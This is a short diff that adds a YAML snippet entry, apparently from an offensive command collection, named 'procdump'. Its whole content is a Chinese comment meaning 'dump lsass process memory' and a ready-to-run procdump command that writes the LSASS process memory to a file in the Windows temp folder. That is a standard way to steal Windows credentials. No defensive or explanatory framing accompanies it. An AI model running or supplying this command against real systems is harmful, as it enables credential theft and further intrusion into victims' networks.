@@ -1,0 +1,7 @@
+name: procdump
+tags: [procdump, proc]
+data: |
+  # 转储lsass进程内存
+  procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+
+  
